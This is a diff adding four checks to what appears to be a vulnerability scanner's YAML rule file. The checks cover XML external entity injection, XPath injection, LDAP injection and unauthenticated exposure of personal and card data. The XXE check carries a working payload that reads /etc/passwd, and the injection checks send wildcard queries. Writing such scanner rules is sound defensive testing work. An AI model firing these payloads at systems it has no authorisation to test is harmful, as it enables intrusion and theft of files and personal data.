@@ -78,3 +78,43 @@
   match:
     status: 200
     body_contains: "postgres://"
+
+- id: xxe-metadata
+  severity: critical
+  title: XML external entity (XXE) reads /etc/passwd
+  request:
+    method: POST
+    path: "/api/metadata"
+    content_type: "application/xml"
+    body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
+  match:
+    body_contains: "root:x:0:0"
+
+- id: xpath-injection
+  severity: high
+  title: XPath injection (raw XPath returns all records)
+  request:
+    method: GET
+    path: "/api/partners/query?xpath=//%2A"
+  match:
+    status: 200
+    body_contains: "<partner>"
+
+- id: ldap-injection
+  severity: medium
+  title: LDAP injection point (backend error disclosed)
+  request:
+    method: GET
+    path: "/api/users/ldap?query=%2A"
+  match:
+    body_regex: "(?i)(LDAP: error|NamingException)"
+
+- id: unauth-pii-exposure
+  severity: critical
+  title: Unauthenticated access to user PII including card numbers
+  request:
+    method: GET
+    path: "/api/users/search/a"
+  match:
+    status: 200
+    body_contains: "cardNumber"
